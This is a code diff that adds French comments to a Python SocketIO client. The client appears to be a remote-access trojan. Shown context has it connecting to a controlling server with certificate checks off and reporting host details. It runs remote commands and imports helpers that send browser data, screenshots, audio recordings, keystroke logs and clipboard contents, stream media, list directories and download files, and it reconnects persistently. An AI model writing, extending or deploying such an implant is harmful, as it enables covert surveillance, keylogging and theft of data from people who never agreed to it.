@@ -9,31 +9,34 @@ from database_utils import send_browser_data
 from media_utils import take_and_send_screenshot, record_and_send_audio, record_and_send_keyboard_log, download_file, \
     start_stream as start_media_stream, stop_stream as stop_media_stream, get_clipboard_content, list_dir
 
+# Initialisation du client SocketIO
 sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)
 
 
+# Fonction pour afficher les messages de log
 def log_event(message):
     print(message)
 
 
+# Définition des fonctions pour les événements SocketIO
 @sio.event
-def connect():
+def connect(): # Lorsque le client se connecte au serveur
     log_event("Connection réussie")
     sio.emit('system_info', {'os': platform.system(), 'os_version': platform.version(), 'hostname': platform.node()})
 
 
 @sio.event
-def connect_error(data):
+def connect_error(data): # Lorsque la connexion échoue
     log_event(f"Connection échouée: {data}")
 
 
 @sio.event
-def disconnect():
+def disconnect(): # Lorsque le client se déconnecte du serveur
     log_event("Connection perdue")
 
 
 @sio.event
-def command(data):
+def command(data): # Lorsqu'une commande est reçue du serveur
     command = data.get('command')
     user_id = data.get('user_id')
     params = data.get('params', {})
@@ -72,19 +75,19 @@ def command(data):
 
 
 @sio.event
-def start_stream(data):
+def start_stream(data): # Lorsqu'une demande de streaming est reçue
     user_id = data.get('user_id')
     threading.Thread(target=start_media_stream, args=(sio, user_id)).start()
 
 
 @sio.event
-def stop_stream(data):
+def stop_stream(data): # Lorsqu'une demande d'arrêt de streaming est reçue
     user_id = data.get('user_id')
     stop_media_stream(user_id)
 
 
 @sio.event
-def list_directory(data):
+def list_directory(data): # Lorsqu'une demande de liste de répertoire est reçue
     directory = data.get('dir_path')
     if directory is None:
         if platform.system() == 'Windows':
@@ -94,6 +97,7 @@ def list_directory(data):
     list_dir(sio, directory)
 
 
+# Fonction pour tenter de se reconnecter au serveur
 def attempt_reconnect(server_url):
     while not sio.connected:
         try:
@@ -105,6 +109,7 @@ def attempt_reconnect(server_url):
             time.sleep(5)
 
 
+# Fonction pour démarrer le client SocketIO
 def start_client(server_url):
     attempt_reconnect(server_url)
     sio.wait()
